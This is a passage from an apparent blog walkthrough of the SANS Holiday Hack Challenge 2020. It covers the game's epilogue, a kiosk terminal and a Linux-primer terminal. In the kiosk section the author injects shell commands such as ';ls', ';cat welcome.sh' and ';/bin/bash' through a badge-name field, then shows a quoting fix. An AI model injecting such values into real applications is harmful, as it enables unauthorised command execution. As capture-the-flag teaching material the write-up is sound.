<p><strong>Jack</strong> initially added the new block with the correct data about him. However, the block was ready to be altered anytime. The initial <em>PDF</em> was already merged with the evil one and the collision blocks were already part of the documents. He then just needed to wait the right moment to change those 4 bytes without being spotted!</p>
<p><strong>Tinsel</strong> does not seem more enthusiast than normal after this big achievement:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Tinsel Upatree:</strong><br />
The mystery is solved! I can&rsquo;t wait to see which attendee solved it!</div>
<h2 id="epilogue">Epilogue</h2>
<p>Time to go to <em>Santa&rsquo;s Balcony</em> where <strong>Eve Snowshoes</strong> is waiting for <strong>Santa</strong>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Eve Snowshoes:</strong><br />
I&rsquo;m so glad we got the <em>Naughty-Nice Blockchain</em> set right again! Gosh, it would be great to see the <em>SANS Holiday Hack</em> player who helped you fix it!</p>
<p>Can you go find the person who did that and come back here?</p>
</div>
<p>Let&rsquo;s get back our avatar and come back to <strong>Eve</strong>. We have to trick again the <em>Santavator</em> as we did in <a href="#objective-10---defeat-fingerprint-sensor">Objective 10</a>. Once in <em>Santa&rsquo;s Office</em>, <strong>Tinsel</strong> says:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Tinsel Upatree:</strong><br />
You - you did it! You solved the mystery! Quickly, go out to the balcony to be recognized!</div>
<p>This time the door to the balcony is wide open. As soon as we enter it we unlock the last narrative:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative07.webp" alt="narrative 7 of 7" data-caption="narrative 7 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 7 of 7
      
        
        
      
    </figcaption>
  
</figure>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_04.webp" alt="Santa&#39;s balcony - THE END" data-caption="Santa&#39;s balcony - THE END" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa&#39;s balcony - THE END
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Santa:</strong><br />
Thank you for foiling <strong>Jack</strong>&rsquo;s foul plot!</p>
<p>He sent that magical portrait so he could become me and destroy the holidays!</p>
<p>Due to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done!<br />
Ho Ho Ho!</p>
</div>
<p>And poor <strong>Jack</strong> to say:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Jack Frost:</strong><br />
My plan was NEARLY perfect… but I never expected someone with your skills to come around and ruin my plan for ruining the holidays!</p>
<p>And now, they&rsquo;re gonna put me in jail for my deeds.</p>
</div>
<p>Finally, <strong>Eve</strong> gives us access to some hidden swag!</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Eve Snowshoes:</strong><br />
What a fantabulous job! Congratulations!<br />
You MUST let us know how you did it! Feel free to show off your skills with some swag - only for our victors!</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_15.webp" alt="HHC2020 Winner swag" data-caption="HHC2020 Winner swag" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      HHC2020 Winner swag
      
        
        
      
    </figcaption>
  
</figure>
<h2 id="cranpi-terminals">CranPi Terminals</h2>
<h3 id="1---kringle-kiosk">1 - Kringle Kiosk</h3>
<hr />
<div class="box">[ELF] <strong>Shiny Upatree</strong> [LOCATION] <em>Castle Approach</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_01.webp" alt="CranPi Terminal 1 location" data-caption="CranPi Terminal 1 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 1 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Shinny Upatree:</strong><br />
Hiya hiya - I&rsquo;m <strong>Shinny Upatree</strong>! Check out this cool <em>KringleCon</em> kiosk!</p>
<p>You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it&rsquo;s &ldquo;ingestible.&rdquo; Or something…</p>
<p>Do you think you could check and see if there is an issue?</p>
</div>
<p>He suggests us a document on <em>Command Injection</em>:<br />
<div class="notices success" data-title="CranPi 1 hint">
  <ul>
<li>Command Injection - There&rsquo;s probably some kind of <a href="https://owasp.org/www-community/attacks/Command_Injection">command injection</a> vulnerability in the menu terminal.</li>
</ul>

</div></p>
<p>After a welcome message we access the kiosk app:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_02.webp" alt="kiosk menu" data-caption="kiosk menu" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      kiosk menu
      
        
        
      
    </figcaption>
  
</figure>
<p>The first menu shows a map of <strong>Santa</strong>&rsquo;s castle:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_03.webp" alt="castle&#39;s map" data-caption="castle&#39;s map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      castle&#39;s map
      
        
        
      
    </figcaption>
  
</figure>
<p>The second menu displays the <em>KringleCon III</em> and <em>Holiday Hack Challenge Code of Conduct and Terms of Use</em>. The third menu shows the location of each elf:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_04.webp" alt="elves&#39; location" data-caption="elves&#39; location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      elves&#39; location
      
        
        
      
    </figcaption>
  
</figure>
<p>The last menu is the only one that requires user input and seems the best place to try an injection:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_05.webp" alt="print badge name" data-caption="print badge name" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      print badge name
      
        
        
      
    </figcaption>
  
</figure>
<p>If our input is concatenated to a system command without being sanitized first, there are chances that we can inject additional commands. We can, for instance, try to add <code>;ls</code> to our name:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_06.webp" alt="command injection" data-caption="command injection" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      command injection
      
        
        
      
    </figcaption>
  
</figure>
<p>It worked and it works as well with other special characters like <code>&amp;&amp;</code> or <code>|</code>. We can read the <code>welcome.sh</code> script with <code>;cat welcome.sh</code>. We discover the logic of the script and where the vulnerability lies:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_08.webp" alt="welcome.sh snippet 1" data-caption="welcome.sh snippet 1" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      welcome.sh snippet 1
      
        
        
      
    </figcaption>
  
</figure>
<p>To fix the <em>Command Injection</em> vulnerability, we can enclose the <code>$name</code> variable in double-quotes:</p>
<div class="box">bash -c &lsquo;/usr/games/cowsay -f /opt/reindeer.cow &ldquo;$name&rdquo;&rsquo;</div>
<p>We discover as well a hidden menu <code>plant</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_07.webp" alt="welcome.sh snippet 2" data-caption="welcome.sh snippet 2" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      welcome.sh snippet 2
      
        
        
      
    </figcaption>
  
</figure>
<p>where spot our old friend <strong>Jason the Plant</strong> :)</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_09.webp" alt="Jason the Plant" data-caption="Jason the Plant" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Jason the Plant
      
        
        
      
    </figcaption>
  
</figure>
<p>We see that most of the outputs come from files that are stored in <code>/opt</code>. Let&rsquo;s see if there are other hidden gems with <code>;ls -la /opt</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_10.webp" alt="directory listing /opt" data-caption="directory listing /opt" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      directory listing /opt
      
        
        
      
    </figcaption>
  
</figure>
<p>There are 2 additional files: <code>mailbox.txt</code> and <code>success.txt</code>. Both show <em>ASCII</em> art. Nothing else seems interesting, we can finally escape the kiosk app by calling bash <code>;/bin/bash</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi01_11.webp" alt="kiosk escape" data-caption="kiosk escape" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      kiosk escape
      
        
        
      
    </figcaption>
  
</figure>
<p>Back to <strong>Shinny</strong> who gives us no less than 5 hints to complete <a href="#2---investigate-s3bucket">Objective 2</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Shinny Upatree:</strong><br />
Golly - wow! You sure found the flaw for us!</p>
<p>Say, we&rsquo;ve been having an issue with an <em>Amazon S3</em> bucket. Do you think you could help find <strong>Santa</strong>&rsquo;s <code>package</code> file?</p>
<p>Jeepers, it seems there&rsquo;s always a leaky bucket in the news. You&rsquo;d think we could find our own files!<br />
<strong>Digininja</strong> has a great guide, if you&rsquo;re new to <em>S3</em> searching. He even released a tool for the task - what a guy! The package wrapper <strong>Santa</strong> used is reversible, but it may take you some trying.</p>
<p>Good luck, and thanks for pitching in!</p>
</div>
<div class="notices success" data-title="Objective 2 hints">
  <ul>
<li>Find Santa&rsquo;s Package - Find Santa&rsquo;s package file from the cloud storage provider. Check Josh Wright&rsquo;s <a href="https://www.youtube.com/watch?v=t4UzXx5JHk0">talk</a> for more tips!</li>
<li>Bucket_finder.rb - He even wrote a tool to <a href="https://digi.ninja/projects/bucket_finder.php">search for unprotected buckets</a>!</li>
<li>Santa&rsquo;s Wrapper3000 - Santa&rsquo;s Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages.</li>
<li>Finding S3 Buckets - Robin Wood wrote up a guide about <a href="https://digi.ninja/blog/whats_in_amazons_buckets.php">finding these open S3 buckets</a>.</li>
<li>Leaky AWS S3 Buckets - It seems like there&rsquo;s a new story every week about data exposed through unprotected <a href="https://www.computerweekly.com/news/252491842/Leaky-AWS-S3-bucket-once-again-at-centre-of-data-breach">Amazon S3 buckets</a>.</li>
</ul>

</div>
<h3 id="2---linux-primer">2 - Linux Primer</h3>
<hr />
<div class="box">[ELF] <strong>Sugarplum Mary</strong> [LOCATION] <em>Courtyard</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi02_01.webp" alt="CranPi Terminal 2 location" data-caption="CranPi Terminal 2 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 2 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Sugarplum Mary:</strong><br />
<strong>Sugarplum Mary</strong>? That&rsquo;s me!</p>
<p>I was just playing with this here terminal and learning some <em>Linux</em>! It&rsquo;s a great intro to the <em>Bash</em> terminal. If you get stuck at any point, type hintme to get a nudge!</p>
<p>Can you make it to the end?</p>
</div>
<p>We get the following message when we launch the terminal:</p>
<div class="box">The North Pole 🍭 Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command &ldquo;hintme&rdquo; to receive a hint.</div>
<p>This challenge will be a list of <em>Linux</em> commands to run in the terminal. Here are the questions and answers:</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!</div>
<div class="box">$ ls /home/elf # or ls ~<br />
HELP munchkin_19315479765589239 workshop</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. Now find the munchkin inside the munchkin.</div>
<div class="box">$ cat munchkin_19315479765589239<br />
munchkin_24187022596776786</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. Great, now remove the munchkin in your home directory.</div>
<div class="box">$ rm munchkin_19315479765589239</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. Print the present working directory using a command.</div>
<div class="box">$ pwd<br />
/home/elf</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin!</div>
<div class="box">$ ls -la /home/elf # or ls -la ~<br />
total 56<br />
drwxr-xr-x 1 elf  elf   4096 Dec 12 08:43 .<br />
drwxr-xr-x 1 root root  4096 Dec 10 18:14 ..<br />
-rw-r&ndash;r&ndash; 1 elf  elf     31 Dec 10 18:18 .bash_history<br />
-rw-r&ndash;r&ndash; 1 elf  elf    220 Apr  4  2018 .bash_logout<br />
-rw-r&ndash;r&ndash; 1 elf  elf   3105 Dec  5 00:00 .bashrc<br />
-rw-r&ndash;r&ndash; 1 elf  elf      0 Dec 12 08:43 .munchkin_5074624024543078<br />
-rw-r&ndash;r&ndash; 1 elf  elf    807 Apr  4  2018 .profile<br />
-rw-r&ndash;r&ndash; 1 elf  elf    168 Dec  5 00:00 HELP<br />
drwxr-xr-x 1 elf  elf  20480 Dec 10 18:19 workshop</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. Excellent, now find the munchkin in your command history.</div>
<div class="box">$ history<br />
1  echo munchkin_9394554126440791 <br />
2  ls -la <br />
3  cat HELP <br />
4  ls <br />
5  cat munchkin_19315479765589239  <br />
6  rm munchkin_19315479765589239  <br />
7  pwd    8  ls -la <br />
9  history</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Find the munchkin in your environment variables.</div>
<div class="box">$ env<br />
[&hellip;]<br />
z_MUNCHKIN=munchkin_20249649541603754<br />
[&hellip;]</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q8. Next, head into the workshop.</div>
<div class="box">$ cd workshop</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q9. A munchkin is hiding in one of the workshop toolboxes. Use <code>grep</code> while ignoring case to find which toolbox the munchkin is in.</div>
<div class="box">$ grep -i munchkin *.txt # the folder contains 500 text files<br />
toolbox_191.txt:mUnChKin.4056180441832623</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q10. A munchkin is blocking the <code>lollipop_engine</code> from starting. Run the <code>lollipop_engine</code> binary to retrieve this munchkin.</div>
<div class="box">$ chmod +x lollipop_engine<br />
$ ./lollipop_engine<br />
munchkin.898906189498077</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q11. Munchkins have blown the fuses in <code>/home/elf/workshop/electrical</code>. cd into <code>electrical</code> and rename <code>blown_fuse0</code> to <code>fuse0</code>.</div>
<div class="box">$ cd electrical<br />
$ mv blown_fuse0 fuse0</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q12. Now, make a symbolic link (symlink) named <code>fuse1</code> that points to <code>fuse0</code></div>
<div class="box">$ ln -s fuse0 fuse1</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q13. Make a copy of <code>fuse1</code> named <code>fuse2</code>.</div>
<div class="box">$ cp fuse1 fuse2</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q14. We need to make sure munchkins don&rsquo;t come back. Add the characters &ldquo;MUNCHKIN_REPELLENT&rdquo; into the file <code>fuse2</code>.</div>
<div class="box">$ echo &ldquo;MUNCHKIN_REPELLENT&rdquo; &gt; fuse2</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q15. Find the munchkin somewhere in <code>/opt/munchkin_den</code>.</div>
<div class="box">$ find /opt/munchkin_den/ -name munchkin* # searching for filename<br />
$ grep -iR munchkin /opt/munchkin_den/ # searching for file content<br />
$ find /opt/munchkin_den -iname *munchkin* # both failed, searching for case insensitive filename<br />
/opt/munchkin_den<br />
/opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q16. Find the file somewhere in <code>/opt/munchkin_den</code> that is owned by the user <code>munchkin</code>.</div>
<div class="box">$ find /opt/munchkin_den/ -type f -user munchkin<br />
/opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q17. Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in <code>/opt/munchkin_den</code>.</div>
<div class="box">$ find /opt/munchkin_den/ -type f -size +108k -size -110k<br />
/opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q18. List running processes to find another munchkin.</div>
<div class="box">$ ps -aux<br />
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />
init         1  0.0  0.0  65320 21336 pts/0    Ss+  08:34   0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml<br />
elf      63312  0.6  0.0  84316 25840 pts/2    S+   09:14   0:00 /usr/bin/python3 /14516_munchkin<br />
elf      64339  0.0  0.0  36180  3336 pts/3    R+   09:15   0:00 ps -aux</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q19. The <code>14516_munchkin</code> process is listening on a tcp port. Use a command to have the only listening port display to the screen.</div>
<div class="box">$ netstat -l<br />
Active Internet connections (only servers)<br />
Proto Recv-Q Send-Q Local Address  Foreign Address  State   <br />
tcp        0      0 0.0.0.0:54321  0.0.0.0:*        LISTEN</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q20. The service listening on port <code>54321</code> is an <em>HTTP</em> server. Interact with this server to retrieve the last munchkin.</div>
<div class="box">$ curl localhost:54321<br />
munchkin.73180338045875</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q21. Your final task is to stop the <code>14516_munchkin</code> process to collect the remaining lollipops.</div>
<div class="box">$ kill 63312 # PID of the process is 63312, seen in Q18</div>
<p>Once all the tasks are completed, <strong>Sugarplum</strong> gives us a few hints to complete <a href="#3---point-of-sale-passwordrecovery">Objective 3</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Sugarplum Mary:</strong><br />
You did it - great!</p>
